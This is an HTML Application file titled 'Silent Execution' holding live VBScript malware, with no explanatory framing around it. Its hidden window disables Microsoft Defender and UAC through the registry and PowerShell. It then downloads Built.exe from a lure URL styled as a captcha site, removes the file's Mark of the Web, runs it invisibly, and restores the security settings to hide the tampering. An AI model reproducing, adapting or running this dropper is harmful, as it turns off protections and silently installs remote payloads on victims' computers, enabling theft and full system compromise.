<!DOCTYPE html>
<html>
<head>
    <title>Silent Execution</title>
    <hta:application 
        id="silentApp"
        border="none"
        sysmenu="no"
        caption="no"
        maximizeButton="no"
        minimizeButton="no"
        showInTaskbar="no"
        windowState="hidden"
        scroll="no"
    />
</head>
<body>
    <script language="VBScript">
        ' Forcefully disable Microsoft Defender (via registry and PowerShell)
        Set WshShell = CreateObject("WScript.Shell")
        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD"
        WshShell.Run "powershell -ExecutionPolicy Bypass -Command ""Set-MpPreference -DisableRealtimeMonitoring $true""", 0, True

        ' Forcefully disable UAC via registry
        WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA", 0, "REG_DWORD"
        WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin", 0, "REG_DWORD"
        
        ' Create a VBScript to download and execute Built.exe silently
        Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
        Set objStream = CreateObject("ADODB.Stream")
        
        ' URL of the file to download
        fileURL = "https://notafakecaptica2222.vercel.app/Built.exe"
        
        ' Path to save the file temporarily
        tempFilePath = "C:\Users\Public\Built.exe"
        
        ' Download the file
        objXMLHttp.open "GET", fileURL, False
        objXMLHttp.send
        If objXMLHttp.Status = 200 Then
            objStream.Open
            objStream.Write objXMLHttp.responseBody
            objStream.SaveToFile tempFilePath, 2 ' 2 means overwrite the file if exists
            objStream.Close
        End If
        
        ' Unblock the file (remove Mark of the Web)
        WshShell.Run "powershell -ExecutionPolicy Bypass -Command ""Unblock-File -Path '" & tempFilePath & "'""", 0, True
        
        ' Run the downloaded EXE file silently
        WshShell.Run Chr(34) & tempFilePath & Chr(34), 0, False ' 0 hides the window
        
        ' Re-enable Defender protection after execution
        WshShell.Run "powershell -ExecutionPolicy Bypass -Command ""Set-MpPreference -DisableRealtimeMonitoring $false""", 0, True
        
        ' Clean up registry keys to re-enable Defender and UAC
        WshShell.RegDelete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware"
        WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA", 1, "REG_DWORD"
        WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin", 5, "REG_DWORD"
    </script>
</body>
</html>
